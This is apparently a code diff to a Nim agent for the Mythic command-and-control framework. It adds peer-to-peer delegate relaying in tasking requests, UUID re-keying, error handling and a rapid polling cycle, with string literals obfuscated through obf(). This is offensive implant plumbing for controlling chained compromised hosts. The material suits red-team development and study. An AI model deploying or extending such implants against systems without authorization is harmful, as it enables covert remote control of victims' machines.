@@ -342,10 +342,51 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
   ## Get tasking from Mythic
   ## Returns tasks, interactive messages, socks messages, rpfwd messages, and delegates
   ## Also updates agent.callbackUuid if a delayed checkin response is received
+  ## Includes P2P delegate data in the request so Mythic can process delegates
+  ## and return P2P agent tasks in the same HTTP round-trip.
   let getTaskingMsg = %*{
     obf("action"): obf("get_tasking"),
     obf("tasking_size"): -1
   }
+  
+  # Collect P2P delegate and edge data to include in get_tasking.
+  # In standard Mythic protocol, delegates should be included in EVERY request
+  # to Mythic (get_tasking and post_response) so Mythic can process them
+  # inline and return P2P agent responses immediately.
+  var p2pDelegates: seq[JsonNode] = @[]
+  var p2pEdges: seq[JsonNode] = @[]
+  
+  let connectResps = checkActiveConnectConnections()
+  for resp in connectResps:
+    if resp.hasKey(obf("delegates")):
+      for d in resp[obf("delegates")].getElems():
+        p2pDelegates.add(d)
+    elif resp.hasKey(obf("edges")):
+      for e in resp[obf("edges")].getElems():
+        var edgeCopy = e.copy()
+        if edgeCopy.hasKey(obf("source")) and edgeCopy[obf("source")].getStr() == "":
+          edgeCopy[obf("source")] = %agent.callbackUuid
+        p2pEdges.add(edgeCopy)
+  
+  when defined(windows):
+    let linkResps = checkActiveLinkConnections()
+    for resp in linkResps:
+      if resp.hasKey(obf("delegates")):
+        for d in resp[obf("delegates")].getElems():
+          p2pDelegates.add(d)
+      elif resp.hasKey(obf("edges")):
+        for e in resp[obf("edges")].getElems():
+          var edgeCopy = e.copy()
+          if edgeCopy.hasKey(obf("source")) and edgeCopy[obf("source")].getStr() == "":
+            edgeCopy[obf("source")] = %agent.callbackUuid
+          p2pEdges.add(edgeCopy)
+  
+  if p2pDelegates.len > 0:
+    getTaskingMsg[obf("delegates")] = %p2pDelegates
+    debug "[DEBUG] Including ", p2pDelegates.len, " P2P delegate(s) in get_tasking"
+  if p2pEdges.len > 0:
+    getTaskingMsg[obf("edges")] = %p2pEdges
+    debug "[DEBUG] Including ", p2pEdges.len, " P2P edge(s) in get_tasking"
   
   debug "[DEBUG] Sending get_tasking with UUID: ", agent.callbackUuid
   let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
@@ -447,6 +488,19 @@ proc processDelegates*(agent: var Agent, delegates: seq[JsonNode]) =
               debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
           else:
             debug "[DEBUG] Failed to forward delegate to agent ", uuid, " - no active connection"
+        
+        # Handle UUID re-keying (Mythic assigns new UUID after checkin)
+        if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
+          let newUuid = if delegate.hasKey(obf("new_uuid")):
+            delegate[obf("new_uuid")].getStr()
+          else:
+            delegate[obf("mythic_uuid")].getStr()
+          
+          if newUuid != uuid:
+            debug "[DEBUG] Mythic assigned new UUID via get_tasking: ", newUuid, " (old: ", uuid, ")"
+            discard rekeyConnectConnection(uuid, newUuid)
+            when defined(windows):
+              discard rekeyLinkConnection(uuid, newUuid)
       else:
         debug "[DEBUG] Malformed delegate message - missing uuid or message"
 
@@ -760,29 +814,32 @@ proc postResponses*(agent: var Agent) =
       if respJson.hasKey(obf("delegates")):
         let delegates = respJson[obf("delegates")]
         for delegate in delegates:
-          let delegateUuid = delegate[obf("uuid")].getStr()
-          let delegateMessage = delegate[obf("message")].getStr()
-          debug "[DEBUG] Received delegate for ", delegateUuid, " (", delegateMessage.len, " bytes base64)"
-          
-          # Forward delegate message to the P2P agent FIRST (using old UUID)
-          discard forwardDelegateToConnect(delegateUuid, delegateMessage)
-          when defined(windows):
-            discard forwardDelegateToLink(delegateUuid, delegateMessage)
-          
-          # THEN check if Mythic assigned a new UUID and re-key for future messages
-          if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
-            let newUuid = if delegate.hasKey(obf("new_uuid")): 
-              delegate[obf("new_uuid")].getStr() 
-            else: 
-              delegate[obf("mythic_uuid")].getStr()
+          try:
+            let delegateUuid = delegate[obf("uuid")].getStr()
+            let delegateMessage = delegate[obf("message")].getStr()
+            debug "[DEBUG] Received delegate for ", delegateUuid, " (", delegateMessage.len, " bytes base64)"
             
-            if newUuid != delegateUuid:
-              debug "[DEBUG] Mythic assigned new UUID: ", newUuid, " (old: ", delegateUuid, ")"
-              debug "[DEBUG] Re-keying connection for future messages"
-              # Re-key the connection from old UUID to new UUID for future messages
-              discard rekeyConnectConnection(delegateUuid, newUuid)
-              when defined(windows):
-                discard rekeyLinkConnection(delegateUuid, newUuid)
+            # Forward delegate message to the P2P agent FIRST (using old UUID)
+            discard forwardDelegateToConnect(delegateUuid, delegateMessage)
+            when defined(windows):
+              discard forwardDelegateToLink(delegateUuid, delegateMessage)
+            
+            # THEN check if Mythic assigned a new UUID and re-key for future messages
+            if delegate.hasKey(obf("new_uuid")) or delegate.hasKey(obf("mythic_uuid")):
+              let newUuid = if delegate.hasKey(obf("new_uuid")): 
+                delegate[obf("new_uuid")].getStr() 
+              else: 
+                delegate[obf("mythic_uuid")].getStr()
+              
+              if newUuid != delegateUuid:
+                debug "[DEBUG] Mythic assigned new UUID: ", newUuid, " (old: ", delegateUuid, ")"
+                debug "[DEBUG] Re-keying connection for future messages"
+                # Re-key the connection from old UUID to new UUID for future messages
+                discard rekeyConnectConnection(delegateUuid, newUuid)
+                when defined(windows):
+                  discard rekeyLinkConnection(delegateUuid, newUuid)
+          except:
+            debug "[DEBUG] Failed to forward delegate: ", getCurrentExceptionMsg()
       
       if respJson.hasKey(obf("responses")):
         for taskResp in respJson[obf("responses")]:
@@ -1175,6 +1232,26 @@ proc runAgent*() =
     
     # Send responses back (handles background task state machine)
     agentInstance.postResponses()
+    
+    # Rapid P2P polling: after posting responses, do ONE quick poll cycle to pick up
+    # any immediate P2P agent responses before sleeping.
+    block p2pPoll:
+      os.sleep(200)  # Brief delay for P2P agents to respond
+      var hasP2pData = false
+      
+      let pollConnectResps = checkActiveConnectConnections()
+      for response in pollConnectResps:
+        agentInstance.taskResponses.add(response)
+        hasP2pData = true
+      
+      when defined(windows):
+        let pollLinkResps = checkActiveLinkConnections()
+        for response in pollLinkResps:
+          agentInstance.taskResponses.add(response)
+          hasP2pData = true
+      
+      if hasP2pData:
+        agentInstance.postResponses()
     
     # Sleep with jitter
     agentInstance.sleep()
